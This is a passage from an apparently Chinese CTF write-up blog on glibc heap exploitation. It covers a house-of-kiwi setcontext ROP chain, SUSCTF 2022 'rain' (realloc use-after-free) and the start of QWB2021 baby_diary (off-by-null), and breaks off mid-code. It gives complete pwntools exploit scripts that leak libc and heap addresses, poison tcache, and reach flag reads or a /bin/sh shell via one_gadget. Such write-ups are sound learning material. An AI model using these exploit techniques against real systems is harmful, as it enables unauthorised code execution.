alt="XX5tMV.png"></a></p><p>我们可以直接将<code>_IO_file_jumps+0x60</code>设置为setcontext+61，这样调用<code>[rbp+0x60]</code>就会调用setcontext，然后在<code>_IO_helper_jumps</code>中设置各种寄存器的值，主要是设置好rsp和rip的值，将rsp设置为某个chunk的地址，在这个chunk中提前布置好orw链，rip设置为ret，这样当setcontext结束时就会ret到rsp上，也就是布置了orw链的chunk上，执行orw。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/freelibs/amd64/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Idx:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Idx:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">setcontext_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">io_helper_jumps_addr=libc_base+<span class="number">0x1ec8a0</span></span><br><span class="line">sync_addr=libc_base+libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]+<span class="number">0x60</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c1e1</span></span><br><span class="line">ret=libc_base+<span class="number">0x0000000000025679</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30000</span>,p64(heap_base+<span class="number">0xed0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">11</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line">dele(-<span class="number">0x61fe</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(sync_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(setcontext_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>,<span class="number">22</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x40000</span>,p64(heap_base+<span class="number">0x12e0</span>))</span><br><span class="line">dele(<span class="number">22</span>)</span><br><span class="line">dele(<span class="number">23</span>)</span><br><span class="line">dele(-<span class="number">0x81fe</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(io_helper_jumps_addr+<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">flag_addr=heap_base+<span class="number">0x1350</span></span><br><span class="line">orw_addr=heap_base+<span class="number">0x700</span></span><br><span class="line">payload=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(open_addr)+\</span><br><span class="line">    p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(orw_addr)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(read_addr)+\</span><br><span class="line">        p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(orw_addr)+p64(write_addr)</span><br><span class="line">add(<span class="number">0x200</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,p64(heap_base+<span class="number">0x13c0</span>)+p64(ret))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>,<span class="number">22</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">22</span>)</span><br><span class="line">dele(<span class="number">23</span>)</span><br><span class="line">dele(<span class="number">24</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(heap_base+<span class="number">0x15c0</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x18</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>另外，house of kiwi的适用范围有限制，在2.31这个大版本中，小版本号9.7以下可以使用kiwi，小版本9.7及以上不可使用。但2.32的低版本也可以使用kiwi，因为house of kiwi的提出版本为2.32，具体适用小版本号没有测试。</p><h2 id="0x7-SUSCTF-2022-rain【逆向，realloc导致UAF，类型混淆】"><a href="#0x7-SUSCTF-2022-rain【逆向，realloc导致UAF，类型混淆】" class="headerlink" title="0x7.SUSCTF 2022 rain【逆向，realloc导致UAF，类型混淆】"></a>0x7.SUSCTF 2022 rain【逆向，realloc导致UAF，类型混淆】</h2><p><a href="https://imgtu.com/i/XXbbyn"><img src="https://s1.ax1x.com/2022/06/19/XXbbyn.png" alt="XXbbyn.png"></a></p><p>看到<code>sub_4013B4</code>函数</p><p><a href="https://imgtu.com/i/XXbzYF"><img src="https://s1.ax1x.com/2022/06/19/XXbzYF.png" alt="XXbzYF.png"></a></p><p>看起来是进行一些初始化，相当乱，静态分析肯定是不太行的</p><p>看一下<code>sub_400E17</code>函数</p><p><a href="https://imgtu.com/i/XXqETK"><img src="https://s1.ax1x.com/2022/06/19/XXqETK.png" alt="XXqETK.png"></a></p><p>用来打印一些参数。这个函数的参数其实就是sub_4013B4函数中的v5，因此，根据printf的输出可以对v5结构体进行一些恢复。</p><p>另外，在gdb中查看堆块信息也有助于我们恢复结构体，如下图</p><p><a href="https://imgtu.com/i/XvLOG8"><img src="https://s1.ax1x.com/2022/06/20/XvLOG8.png" alt="XvLOG8.png"></a></p><p>对照着printf的输出信息恢复结构体，大致如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rain</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> height;</span><br><span class="line">    <span class="type">uint32_t</span> width;</span><br><span class="line">    <span class="type">uint8_t</span> font_color;</span><br><span class="line">    <span class="type">uint8_t</span> back_color;</span><br><span class="line">    <span class="type">uint8_t</span> pad[<span class="number">6</span>];</span><br><span class="line">    <span class="type">uint8_t</span> *table1;</span><br><span class="line">    <span class="type">uint8_t</span> *table2;</span><br><span class="line">    <span class="type">uint32_t</span> rainfall;</span><br><span class="line">    <span class="type">uint32_t</span> speed;</span><br><span class="line">    <span class="type">uint8_t</span> *func;</span><br><span class="line">    <span class="type">uint8_t</span> *table3;</span><br><span class="line">    <span class="type">uint8_t</span> *unknow1;</span><br><span class="line">    <span class="type">uint8_t</span> *unknow2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此时再看IDA的伪代码已经清晰了不少</p><p><a href="https://imgtu.com/i/XvX8kq"><img src="https://s1.ax1x.com/2022/06/20/XvX8kq.png" alt="XvX8kq.png"></a></p><p>有三个功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;MENU:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Config&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. PrintInfo&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Raining~&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Exit~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;ch&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到config功能</p><p><a href="https://imgtu.com/i/XvvvYq"><img src="https://s1.ax1x.com/2022/06/20/XvvvYq.png" alt="XvvvYq.png"></a></p><p>就是重新设置结构体的各项信息，注意到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v7 = (<span class="type">uint8_t</span> *)<span class="built_in">realloc</span>(a1-&gt;unknow1, v6 - <span class="number">18</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br></pre></td></tr></table></figure><p>当size为0时，即v6-18为0，realloc就相当于free的功能；而当size大于ptr指向chunk的size时，就会另外申请一块chunk，再将原有的chunk free掉。</p><p>config函数使用read函数读取的前18字节用于设置rain的各项参数，18字节之后用于设置table的字符集。</p><p>将config函数封装一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">config</span>(<span class="params">heigh, width, front_color, back_color, rainfall, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = p32(heigh) + p32(width) + p8(front_color) + p8(back_color) + p32(rainfall)</span><br><span class="line">payload = payload.ljust(<span class="number">18</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += content</span><br><span class="line">io.sendafter(<span class="string">&#x27;FRAME&gt; &#x27;</span>, payload)</span><br></pre></td></tr></table></figure><p>PrintInfo功能就是调用sub_400E17进行输出，注意这里</p><p><a href="https://imgtu.com/i/XxPN3n"><img src="https://s1.ax1x.com/2022/06/20/XxPN3n.png" alt="XxPN3n.png"></a></p><p>可以利用这里来泄露libc地址。</p><p>最后一个Raining函数，其实就是执行功能，满屏下雨，但当执行完raining之后</p><p><a href="https://imgtu.com/i/XxPT4H"><img src="https://s1.ax1x.com/2022/06/20/XxPT4H.png" alt="XxPT4H.png"></a></p><p>rain执行完之后，会重新进行初始化。</p><p>整个利用思路就是，我们利用config功能先申请一个0x50的，chunk，然后realloc(v7,0)将其free，由于这道题目的libc版本存在tcache且不存在double free的检测，所以可以直接double free，然后rain一下就会重新初始化，从double free中的两个0x50的chunk中取出一个，接着我们调用config申请一个0x50的chunk，这样就会将double free中剩下的一个chunk取出来，实际上，初始化申请的chunk和我们用config申请的chunk是同一块chunk，然后</p><p><a href="https://imgtu.com/i/jiAbvT"><img src="https://s1.ax1x.com/2022/06/24/jiAbvT.png" alt="jiAbvT.png"></a></p><p>config功能会从buf[18]开始，将之后的数据拷贝到v7中，而此时的v7和a1实际上是同一块chunk，所以从buf[18]开始的数据都会被存入a1中。后面会将userchunk，table1，table2都进行赋值，所以这三个指针我们无法控制。但在show函数中</p><p><a href="https://imgtu.com/i/jiE0MT"><img src="https://s1.ax1x.com/2022/06/24/jiE0MT.png" alt="jiE0MT.png"></a></p><p>如果userchunk存在且userchunk指向的内存有值，才会输出userchunk的内容，否则就会输出table3的内容，我们只需要构造出userchunk指向的内存开头全为空字符，并将table3设置为某个函数的got表地址，就能够通过show功能得到libc地址。</p><p><a href="https://imgtu.com/i/jiE4sO"><img src="https://s1.ax1x.com/2022/06/24/jiE4sO.png" alt="jiE4sO.png"></a></p><p>由于userchunk会指向rain这个结构体，所以我们只需要使buf[18]开头为空字符即可，然后将table3设置为atoi的got表地址，跟着show一下，就可以得到atoi的libc地址。</p><p>libc地址到手之后就可以计算出onegadget的地址，由于这个程序的show功能调用的是rain结构体中的函数指针，因此我们只需要将这个函数指针修改为onegadget的地址，再show就可以getshell。由于config申请chunk时用的是realloc函数</p><p><a href="https://imgtu.com/i/jiV9oj"><img src="https://s1.ax1x.com/2022/06/24/jiV9oj.png" alt="jiV9oj.png"></a></p><p>如果我们申请的chunk和a1-&gt;userchunk指向的chunk大小相当的话，就不会再申请新的chunk。所以我们只需要构造好payload，将show指针修改为onegadget，并且payload大小为0x40到0x48之间，就会重新对a1-&gt;userchunk进行赋值。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> symtable <span class="keyword">import</span> Symbol</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./rain&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./rain&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/freelibs/amd64/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">config</span>(<span class="params">heigh, width, front_color, back_color, rainfall, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = p32(heigh) + p32(width) + p8(front_color) + p8(back_color) + p32(rainfall)</span><br><span class="line">payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += content</span><br><span class="line">io.sendafter(<span class="string">&#x27;FRAME&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raining</span>():</span><br><span class="line">    io.sendafter(<span class="string">&#x27;ch&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">config(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">config(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">config(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">raining()</span><br><span class="line">payload=p32(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x102</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span>+p32(<span class="number">0x64</span>)+p32(<span class="number">0xc350</span>)+p64(<span class="number">0x400e17</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">config(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">64</span>,payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">show()</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">onegadget=libc_base+<span class="number">0x10a45c</span></span><br><span class="line">payload=p32(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x102</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span>+p32(<span class="number">0x64</span>)+p32(<span class="number">0xc350</span>)+p64(onegadget)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">config(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">64</span>,payload)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f365 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f3c2 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a45c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="0x8-QWB2021-baby-diary【off-by-null】"><a href="#0x8-QWB2021-baby-diary【off-by-null】" class="headerlink" title="0x8.QWB2021 baby_diary【off-by-null】"></a>0x8.QWB2021 baby_diary【off-by-null】</h2><p>一共三个功能</p><p><a href="https://imgtu.com/i/jjbvpn"><img src="https://s1.ax1x.com/2022/07/24/jjbvpn.png" alt="jjbvpn.png"></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> chunknum; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> readnum; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( chunknum = <span class="number">0</span>; chunknum &lt;= <span class="number">24</span> &amp;&amp; chunklists[chunknum]; ++chunknum )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( chunknum &lt;= <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    num = read_num();</span><br><span class="line">    chunklists[chunknum] = <span class="built_in">malloc</span>(num + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( chunklists[chunknum] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      readnum = readstr(chunklists[chunknum], num, <span class="number">10</span>);</span><br><span class="line">      addchecknum(chunknum, readnum);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add功能能申请25个chunk，并且大小没有限制，需要注意的是，malloc的size是num+1，readstr函数存在会将输入的数据后面添加\x00，进行截断，由于num的原因，readstr并不会直接造成off-by-null，addchecknum函数才是导致off-by-null的真正原因。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_1528</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> chunknum, <span class="type">int</span> readnum)</span></span><br><span 